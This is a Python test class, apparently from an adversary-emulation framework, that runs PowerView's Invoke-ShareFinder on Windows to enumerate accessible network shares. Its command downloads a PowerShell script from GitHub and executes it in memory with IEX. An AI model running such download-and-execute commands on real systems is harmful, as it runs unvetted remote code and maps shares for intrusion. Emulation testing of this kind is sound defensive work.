import platform
from datetime import datetime
from typing import Dict
from executor.BaseTest import BaseTest

class InvokeShareFinderTest(BaseTest):
    TEST_NAME = "sharefinder"
    CATEGORY  = "discovery"

    def run(self, config: Dict) -> Dict:
        if not self.is_windows:
            return self._fail_test("Invoke-ShareFinder is Windows-only")

        # Single PowerShell command to load and execute in-memory
        combined_cmd = (
            "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/"
            "darkoperator/Veil-PowerView/master/PowerView/functions/Invoke-ShareFinder.ps1'); "
            "Invoke-ShareFinder -CheckShareAccess"
        )

        @self.log_command(name="Invoke-ShareFinder Full Execution")
        def run_powershell():
            return self.execute_command(["powershell", "-Command", combined_cmd])

        result = run_powershell()

        return {
            "status": "success" if result['return_code'] == 0 else "failure",
            "executed_command": "Invoke-ShareFinder",
            "comment": result['stderr'] or result['stdout'],
            "output": result['stdout']
        }

    def _fail_test(self, msg: str) -> Dict:
        return {
            "status": "error",
            "executed_command": "Invoke-ShareFinder",
            "comment": msg
        }
